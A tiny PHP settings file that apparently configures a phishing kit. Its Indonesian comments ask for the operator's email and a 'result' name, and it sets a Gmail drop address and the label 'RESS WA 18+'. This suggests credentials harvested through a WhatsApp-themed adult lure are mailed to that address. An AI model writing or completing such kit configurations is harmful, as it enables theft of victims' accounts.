<?php

$emel = 'wificertified03@gmail.com'; // EMAIL KAMU

$res = 'RESS WA 18+ '; // Nama Result

?>